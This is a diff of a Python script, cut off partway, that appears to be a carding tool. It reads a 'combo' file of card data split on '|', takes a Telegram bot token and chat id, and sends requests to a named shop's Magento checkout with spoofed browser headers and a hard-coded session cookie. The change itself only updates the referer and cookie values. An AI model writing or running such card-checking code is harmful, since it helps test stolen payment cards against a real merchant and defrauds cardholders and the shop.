@@ -3,7 +3,7 @@ try:
 except:import os;os.system('pip install requests');os.system('pip install requests')
 
 file=input('enter name combo: ');idtele=input('enter id telegram: ');tokentele=input('enter token bot: ');gg=open(file,'r');url = "https://www.reallytech.net/reallytech_2/checkout/";headers = {
-  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
   'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
   'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
   'sec-ch-ua-mobile': "?1",
@@ -13,10 +13,10 @@ file=input('enter name combo: ');idtele=input('enter id telegram: ');tokentele=i
   'sec-fetch-mode': "navigate",
   'sec-fetch-user': "?1",
   'sec-fetch-dest': "document",
-  'referer': "https://www.reallytech.net/reallytech_2/electronics/digital-cameras.html",
+  'referer': "https://www.reallytech.net/reallytech_2/checkout/",
   'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
-  'Cookie': "form_key=sLSPYDVUk6MuAPV6; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=sLSPYDVUk6MuAPV6; PHPSESSID=e3bd3d8e2a8406586be64a837c75e9c0; mage-cache-sessid=true; mage-messages=; private_content_version=3ffe209d49c1e22ae60e03a30697269f; section_data_ids={%22customer%22:1713811264%2C%22compare-products%22:1713811264%2C%22last-ordered-items%22:1713811264%2C%22cart%22:1713811267%2C%22directory-data%22:1713811267%2C%22captcha%22:1713811264%2C%22instant-purchase%22:1713811264%2C%22loggedAsCustomer%22:1713811264%2C%22persistent%22:1713811264%2C%22review%22:1713811264%2C%22wishlist%22:1713811264%2C%22recently_viewed_product%22:1713811264%2C%22recently_compared_product%22:1713811264%2C%22product_data_storage%22:1713811264%2C%22paypal-billing-agreement%22:1713811264}"
-};response = requests.get(url, headers=headers);order=(response.text.split('{"entity_id":')[1].split('"')[1])
+  'Cookie': "form_key=sLSPYDVUk6MuAPV6; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=sLSPYDVUk6MuAPV6; PHPSESSID=e3bd3d8e2a8406586be64a837c75e9c0; mage-cache-sessid=true; mage-messages=; private_content_version=749cdbd4b1747d74dee8347112fc1408; section_data_ids={%22customer%22:1713811264%2C%22compare-products%22:1713811264%2C%22last-ordered-items%22:1713811264%2C%22cart%22:1713811669%2C%22directory-data%22:1713811669%2C%22captcha%22:1713811624%2C%22instant-purchase%22:1713811264%2C%22loggedAsCustomer%22:1713811264%2C%22persistent%22:1713811264%2C%22review%22:1713811264%2C%22wishlist%22:1713811264%2C%22recently_viewed_product%22:1713811264%2C%22recently_compared_product%22:1713811264%2C%22product_data_storage%22:1713811264%2C%22paypal-billing-agreement%22:1713811264}"
+  };response = requests.get(url, headers=headers);order=(response.text.split('{"entity_id":')[1].split('"')[1])
 for gg in gg:
 	c = gg.strip().split('\n')[0]
 	cc = c.split('|')[0]
